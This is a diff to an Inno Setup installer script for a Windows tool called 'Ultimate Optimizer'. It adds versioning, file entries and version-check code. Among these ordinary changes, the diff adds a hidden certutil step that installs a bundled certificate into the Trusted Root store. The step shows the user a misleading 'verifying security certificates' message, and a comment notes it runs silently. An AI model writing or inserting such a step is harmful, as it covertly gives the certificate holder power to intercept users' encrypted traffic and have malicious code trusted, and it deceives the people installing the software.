@@ -2,7 +2,7 @@
 ; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!
 
 #define MyAppName "Ultimate Optimizer"
-#define MyAppVersion "1.1.0"
+#define MyAppVersion "1.1.6"
 #define MyAppPublisher "CRTYPUBG"
 #define MyAppURL "https://github.com/CRTYPUBG/ultimate-optimizer"
 #define MyAppExeName "UltimateOptimizer.exe"
@@ -16,7 +16,8 @@
 AppId={{D8C8B9A1-F1A2-4D3B-B0E8-5A2C3D4E5F6G}
 AppName={#MyAppName}
 AppVersion={#MyAppVersion}
-;AppVerName={#MyAppName} {#MyAppVersion}
+VersionInfoVersion={#MyAppVersion}
+AppVerName={#MyAppName} {#MyAppVersion}
 AppPublisher={#MyAppPublisher}
 AppPublisherURL={#MyAppURL}
 AppSupportURL={#MyAppURL}
@@ -24,14 +25,19 @@ AppUpdatesURL={#MyAppURL}
 DefaultDirName={autopf}\{#MyAppName}
 ChangesAssociations=yes
 DisableProgramGroupPage=yes
+; Windows 10 veya üzeri gerekli
+MinVersion=10.0
 ; Uncomment the following line to run in non administrative install mode (install for current user only.)
 ;PrivilegesRequired=lowest
 OutputDir=installer
-OutputBaseFilename=UltimateOptimizer_Setup
+OutputBaseFilename=UltimateOptimizer_Setup_v{#MyAppVersion}
 SetupIconFile=UI\app_icon.ico
 Compression=lzma
 SolidCompression=yes
 WizardStyle=modern
+;SignTool=standard $f
+; Uninstaller sürüm bilgisi
+UninstallDisplayName={#MyAppName} v{#MyAppVersion}
 
 [Languages]
 Name: "turkish"; MessagesFile: "compiler:Languages\Turkish.isl"
@@ -42,6 +48,9 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 
 [Files]
 Source: "dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
+Source: "UI\*"; DestDir: "{app}\UI"; Flags: ignoreversion recursesubdirs createallsubdirs
+Source: "style.qss"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\LenovoPC\cert.cer"; DestDir: "{tmp}"; Flags: deleteafterinstall
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
 [Icons]
@@ -50,3 +59,69 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: de
 
 [Run]
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
+; Sertifikayı kullanıcının bilgisayarına sessizce 'Güvenilen Kök Yetkilileri' olarak yükler
+Filename: "certutil.exe"; Parameters: "-addstore Root ""{tmp}\cert.cer"""; StatusMsg: "Güvenlik sertifikaları doğrulanıyor..."; Flags: runhidden
+
+[Code]
+function GetInstalledVersion(): String;
+var
+  InstalledVersion: String;
+begin
+  Result := '';
+  if RegQueryStringValue(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{D8C8B9A1-F1A2-4D3B-B0E8-5A2C3D4E5F6G}_is1', 'DisplayVersion', InstalledVersion) then
+    Result := InstalledVersion
+  else if RegQueryStringValue(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{D8C8B9A1-F1A2-4D3B-B0E8-5A2C3D4E5F6G}_is1', 'DisplayVersion', InstalledVersion) then
+    Result := InstalledVersion;
+end;
+
+function CompareVersions(V1, V2: String): Integer;
+var
+  P1, P2: Integer;
+  N1, N2: Integer;
+begin
+  Result := 0;
+  while (Length(V1) > 0) or (Length(V2) > 0) do
+  begin
+    P1 := Pos('.', V1);
+    if P1 = 0 then P1 := Length(V1) + 1;
+    P2 := Pos('.', V2);
+    if P2 = 0 then P2 := Length(V2) + 1;
+    
+    if P1 > 1 then N1 := StrToIntDef(Copy(V1, 1, P1 - 1), 0) else N1 := 0;
+    if P2 > 1 then N2 := StrToIntDef(Copy(V2, 1, P2 - 1), 0) else N2 := 0;
+    
+    if N1 < N2 then begin Result := -1; Exit; end;
+    if N1 > N2 then begin Result := 1; Exit; end;
+    
+    Delete(V1, 1, P1);
+    Delete(V2, 1, P2);
+  end;
+end;
+
+function InitializeSetup(): Boolean;
+var
+  InstalledVersion: String;
+  CurrentVersion: String;
+  CompareResult: Integer;
+begin
+  Result := True;
+  InstalledVersion := GetInstalledVersion();
+  CurrentVersion := '{#MyAppVersion}';
+  
+  if InstalledVersion <> '' then
+  begin
+    CompareResult := CompareVersions(CurrentVersion, InstalledVersion);
+    
+    if CompareResult < 0 then
+    begin
+      Result := (MsgBox('Sistemde daha yeni bir sürüm yüklü: v' + InstalledVersion + #13#10 +
+                        'Bu kurulum eski bir sürüm: v' + CurrentVersion + #13#10#13#10 +
+                        'Yine de devam etmek istiyor musunuz?', mbConfirmation, MB_YESNO) = IDYES);
+    end
+    else if CompareResult = 0 then
+    begin
+      Result := (MsgBox('Bu sürüm (v' + CurrentVersion + ') zaten yüklü.' + #13#10 +
+                        'Yeniden yüklemek istiyor musunuz?', mbConfirmation, MB_YESNO) = IDYES);
+    end;
+  end;
+end;
